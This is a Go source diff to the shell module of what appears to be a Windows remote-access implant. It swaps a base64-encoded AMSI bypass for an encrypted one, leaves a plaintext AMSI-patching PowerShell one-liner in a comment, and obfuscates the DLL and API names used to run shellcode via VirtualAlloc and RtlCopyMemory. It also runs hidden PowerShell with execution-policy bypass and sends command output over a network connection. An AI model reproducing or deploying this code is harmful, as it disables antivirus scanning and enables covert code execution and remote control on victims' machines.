@@ -1,7 +1,6 @@
 package shell
 
 import (
-	"encoding/base64"
 	"fmt"
 	"io"
 	"log"
@@ -30,9 +29,9 @@ func Shell() *exec.Cmd {
 
 // Powershell ...
 func Powershell() (*exec.Cmd, error) {
-	amsiBypassEncoded := "ZnVuY3Rpb24gTG9va3VwRnVuYyB7CiAgUGFyYW0gKCRtb2R1bGVOYW1lLCAkZnVuY3Rpb25OYW1lKQogICRhc3NlbSA9IChbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfCBXaGVyZS1PYmplY3QgeyAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoJ1xcJylbLTFdLkVxdWFscygnU3lzdGVtLmRsbCcpIH0pLkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKICAkdG1wPUAoKQogICRhc3NlbS5HZXRNZXRob2RzKCkgfCBGb3JFYWNoLU9iamVjdCB7SWYoJF8uTmFtZSAtZXEgIkdldFByb2NBZGRyZXNzIikgeyR0bXArPSRffX0KICByZXR1cm4gJHRtcFswXS5JbnZva2UoJG51bGwsIEAoKCRhc3NlbS5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpKS5JbnZva2UoJG51bGwsIEAoJG1vZHVsZU5hbWUpKSwgJGZ1bmN0aW9uTmFtZSkpCn0KZnVuY3Rpb24gZ2V0RGVsZWdhdGVUeXBlIHsKICBQYXJhbSAoCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkZnVuYywgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJGRlbFR5cGUgPSBbVm9pZF0KICApCiAgJHR5cGUgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi4KICBEZWZpbmVEeW5hbWljQXNzZW1ibHkoKE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpKSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKS4KICBEZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQogICR0eXBlLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJGZ1bmMpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICR0eXBlLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJGRlbFR5cGUsICRmdW5jKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICByZXR1cm4gJHR5cGUuQ3JlYXRlVHlwZSgpCn0KW0ludFB0cl0kZnVuY0FkZHIgPSBMb29rdXBGdW5jIGFtc2kuZGxsIEFtc2lPcGVuU2Vzc2lvbgokb2xkUHJvdGVjdGlvbkJ1ZmZlciA9IDAKJHZwPVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChMb29rdXBGdW5jIGtlcm5lbDMyLmRsbCBWaXJ0dWFsUHJvdGVjdCksIChnZXREZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkpKQokdnAuSW52b2tlKCRmdW5jQWRkciwgMywgMHg0MCwgW3JlZl0kb2xkUHJvdGVjdGlvbkJ1ZmZlcikKJGJ1ZiA9IFtCeXRlW11dICgweDQ4LCAweDMxLCAweEMwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRidWYsIDAsICRmdW5jQWRkciwgMykKJHZwLkludm9rZSgkZnVuY0FkZHIsIDMsIDB4MjAsIFtyZWZdJG9sZFByb3RlY3Rpb25CdWZmZXIp"
-	amsiBypass, _ := base64.StdEncoding.DecodeString(amsiBypassEncoded)
-	cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-exec", "ByPaSs", "-NoExit", "-CoMmAnD", string(amsiBypass))
+	// $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+	amsiBypass := utils.DecryptString("fCJpAxExPh56GTAnPS42NDp6HyYgDDokPTB8cXgSNzExOSA8cGc2eCo6eGc1cWMvMSV0cGc2dg01NSZ0dS89MyZ0emk9DTc9NDB2cWMvfCBpfCEpJXhwPH5wO20TPTcSMSY4PDB8fw07NhMhOi89O28HLCIgMSBzcXgSNzExOSA8cGcxeCo6eGcwcWMvMSV0cGcxdg01NSZ0dS89MyZ0emkXNy0gPTsgemp0I2cyZWcxJT5vfCRpfCV6HyYgDiI4LSZ8fC0hNC99YxgdNjcELDEJfDMgKn5wP3gPES0ga3EPBR5wOjYyeH50GGtkcXgPCzonLCY5dhEhNjc9NSZ6ES0gPTE7KBAxKjU9OyYndg41KjA8OS8JYnkXNzMtcGc2LSV4eHN4eGckLDF4eHJ9")
+	cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-exec", "bypass", "-NoExit", "-command", string(amsiBypass))
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd, nil
 }
@@ -60,7 +59,7 @@ func Exec(command string, c net.Conn) {
 // ExecPS ...
 func ExecPS(command string, c net.Conn) {
 	path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-	cmd := exec.Command(path, "-exec", "bypaSs", "-command", command+"\n")
+	cmd := exec.Command(path, "-exec", "bypass", "-command", command+"\n")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	cmd.Stdout = c
 	cmd.Stderr = c
@@ -77,9 +76,14 @@ func ExecOut(command string) (string, error) {
 }
 
 // ExecPSOut execute a ps command and retrieves the output
-func ExecPSOut(command string) (string, error) {
+func ExecPSOut(command string, encoded bool) (string, error) {
 	path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-	cmd := exec.Command(path, "-exec", "bypaSs", "-command", command+"\n")
+	var cmd *exec.Cmd
+	if encoded {
+		cmd = exec.Command(path, "-exec", "bypaSs", "-encodedcommand", command+"\n")
+	} else {
+		cmd = exec.Command(path, "-exec", "bypaSs", "-command", command+"\n")
+	}
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	out, err := cmd.CombinedOutput()
 	return string(out), err
@@ -98,7 +102,7 @@ func ExecDebug(cmd string) (string, error) {
 
 // ExecPSDebug ...
 func ExecPSDebug(cmd string) (string, error) {
-	out, err := ExecPSOut(cmd)
+	out, err := ExecPSOut(cmd, false)
 	if err != nil {
 		log.Println(err)
 		return err.Error(), err
@@ -118,10 +122,10 @@ func ExecSilent(command string, c net.Conn) {
 // ExecSC executes Shellcode
 func ExecSC(sc []byte) {
 	// ioutil.WriteFile("met.dll", sc, 0644)
-	kernel32 := syscall.MustLoadDLL("kernel32.dll")
-	ntdll := syscall.MustLoadDLL("ntdll.dll")
-	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
-	RtlCopyMemory := ntdll.MustFindProc("RtlCopyMemory")
+	kernel32 := syscall.MustLoadDLL(utils.DecryptString("MyYmNiY4a3F6PC84"))         // kernel32.dll
+	ntdll := syscall.MustLoadDLL(utils.DecryptString("NjcwNC96PC84"))                // ntdll.dll
+	VirtualAlloc := kernel32.MustFindProc(utils.DecryptString("DiomLDY1NAI4NCw3"))   // VirtualAlloc
+	RtlCopyMemory := ntdll.MustFindProc(utils.DecryptString("Cjc4GywkIQ4xNSwmIQ==")) // RtlCopyMemory
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sc)), memCommit|memReserve, pageExecuteReadWrite)
 	if addr == 0 {
 		log.Println(err)
@@ -162,7 +166,7 @@ func RunAsPS(user string, pass string, domain string, c net.Conn) {
 	cmdLine += fmt.Sprintf("$session = New-PSSession -Credential $credential;")
 	cmdLine += fmt.Sprintf("Invoke-Command -Session $session -ScriptBlock {%s};", cmd)
 
-	_, err := ExecPSOut(cmdLine)
+	_, err := ExecPSOut(cmdLine, false)
 	if err != nil {
 		c.Write([]byte(fmt.Sprintf("\nRunAsPS Failed: %s\n", err)))
 		return
